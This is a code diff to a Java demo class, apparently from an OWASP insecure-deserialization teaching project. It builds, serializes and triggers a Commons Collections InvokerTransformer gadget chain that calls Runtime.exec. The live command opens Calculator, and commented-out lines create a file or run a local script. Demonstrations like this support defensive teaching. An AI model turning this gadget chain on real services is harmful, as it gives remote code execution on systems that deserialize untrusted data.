@@ -1,4 +1,4 @@
-package com.doku.doku_owasp_example.insecure_deserialization;
+package com.doku.doku_owasp_example.insecure_deserialization.example;
 
 import lombok.extern.slf4j.Slf4j;
 import org.apache.commons.collections4.Transformer;
@@ -35,12 +35,13 @@ public class Simulation2GeneratePayload
 
     private static Map createMaliciousPayload()
     {
-        Transformer[] transformers = new Transformer[]{
+        Transformer[] transformers = new Transformer[]
+        {
             new ConstantTransformer<>(Runtime.class),
             new InvokerTransformer<>("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
             new InvokerTransformer<>("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
             new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app"}),
-//            new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"touch /home/3000/delete-me-%s.txt".formatted(System.currentTimeMillis())}),
+            //new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"touch /home/3000/delete-me-%s.txt".formatted(System.currentTimeMillis())}),
             //new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"/Users/daniel/Downloads/create-dummy-file.sh"}),
             new ConstantTransformer<>(Runtime.class)
         };
@@ -69,7 +70,7 @@ public class Simulation2GeneratePayload
             out.close();
             fileOut.close();
         }
-        catch (Exception ex)
+        catch(Exception ex)
         {
             log.error("Error occurred.", ex);
         }
@@ -85,13 +86,11 @@ public class Simulation2GeneratePayload
             Object o = ois.readObject();
 
             Map m = (Map) o;
-            //Map.Entry e = (Map.Entry) m.entrySet().iterator().next();
-            //e.setValue("Setting this trigger transformer to be executed.");
-            m.put("key", "Malicious code will be executed if this line is executed.");
+            m.put("new-value", "Malicious code will be executed if this line is executed."); // Adding new value to map will execute the malicious code.
 
             log.info("Class: {}", o.getClass());
-            System.out.println(o.getClass());
-        } catch (Exception ex)
+        }
+        catch(Exception ex)
         {
             log.error("Error occurred.", ex);
         }
